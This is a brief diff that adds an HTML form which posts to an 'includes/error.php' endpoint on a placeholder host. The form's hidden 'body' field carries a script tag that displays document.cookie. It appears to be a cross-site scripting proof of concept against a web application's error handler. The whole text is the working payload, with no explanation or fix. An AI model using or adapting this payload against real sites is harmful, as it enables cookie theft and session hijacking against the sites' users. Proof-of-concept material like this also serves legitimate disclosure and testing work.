@@ -1,0 +1,5 @@
+<form action="http://[host]/includes/error.php" method="post">
+<input type="hidden" name="ajax" value="1" />
+<input type="hidden" name="body" value='<script>alert(document.cookie);</script>' />
+<input type="submit" id="btn"> 
+</form>
